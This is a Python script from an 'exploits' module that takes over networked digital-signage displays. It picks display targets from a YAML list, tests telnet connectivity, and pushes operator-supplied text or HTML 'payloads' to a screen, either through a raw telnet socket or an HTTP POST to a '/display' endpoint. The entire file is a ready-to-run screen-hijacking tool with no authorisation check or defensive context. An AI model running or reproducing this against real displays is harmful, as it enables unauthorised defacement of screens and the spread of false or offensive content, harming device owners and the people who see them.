#!/usr/bin/env python3
# modules/exploits/screen_override.py

import yaml
import os
import sys
import time
import socket
from utils.yaml_loader import load_yaml
from tools.readme_autoupdate import log_action

TARGET_FILE = "config/targets.yaml"
PAYLOAD_DIR = "results/screen_override_payloads"
TIMEOUT = 5
TELNET_PORT = 23
CMD_PATH = "/display"  # endpoint for HTTP-based signage

def find_display_targets():
    devices = load_yaml(TARGET_FILE)
    return {name: props for name, props in devices.items()
            if props.get("type") == "display" and props.get("ip")}

def test_connect(ip, port):
    try:
        sock = socket.create_connection((ip, port), timeout=TIMEOUT)
        sock.close()
        return True
    except:
        return False

def save_payload(name, content):
    os.makedirs(PAYLOAD_DIR, exist_ok=True)
    fn = os.path.join(PAYLOAD_DIR, f"{name.replace(' ','_')}_payload.html")
    with open(fn, "w") as f:
        f.write(content)
    return fn

def deploy_payload_telnet(ip, payload_file):
    with open(payload_file, "r") as f:
        payload = f.read()
    sock = socket.create_connection((ip, TELNET_PORT), timeout=TIMEOUT)
    sock.sendall(payload.encode() + b"\n")
    sock.close()
    return True

def deploy_payload_http(ip, payload_file):
    import requests
    url = f"http://{ip}{CMD_PATH}"
    with open(payload_file, "r") as f:
        content = f.read()
    resp = requests.post(url, data={"html": content}, timeout=TIMEOUT)
    return resp.status_code == 200

def ready2go_screen():
    targets = find_display_targets()
    if not targets:
        print("No display targets found.")
        return

    print("Found display targets:")
    for i, (name, props) in enumerate(targets.items()):
        print(f"[{i}] {name} (IP: {props['ip']})")

    choice = input("Select a target: ")
    try:
        idx = int(choice)
        name, props = list(targets.items())[idx]
    except:
        print("Invalid choice"); return

    ip = props["ip"]
    print(f"Checking connectivity to {ip}...", end="")
    if not test_connect(ip, TELNET_PORT):
        print("FAILED")
        return
    print("OK")

    content = input("Enter text or HTML to display on screen:\n> ")
    payload_file = save_payload(name, content)
    print(f"Payload saved as {payload_file}")

    method = props.get("method", "telnet")
    print(f"Deploying via {method}")
    ok = deploy_payload_telnet(ip, payload_file) if method == "telnet" else deploy_payload_http(ip, payload_file)
    if ok:
        print("Payload deployed successfully.")
        log_action(f"screen_override -> {name}")
    else:
        print("Deployment failed.")

if __name__ == "__main__":
    ready2go_screen()
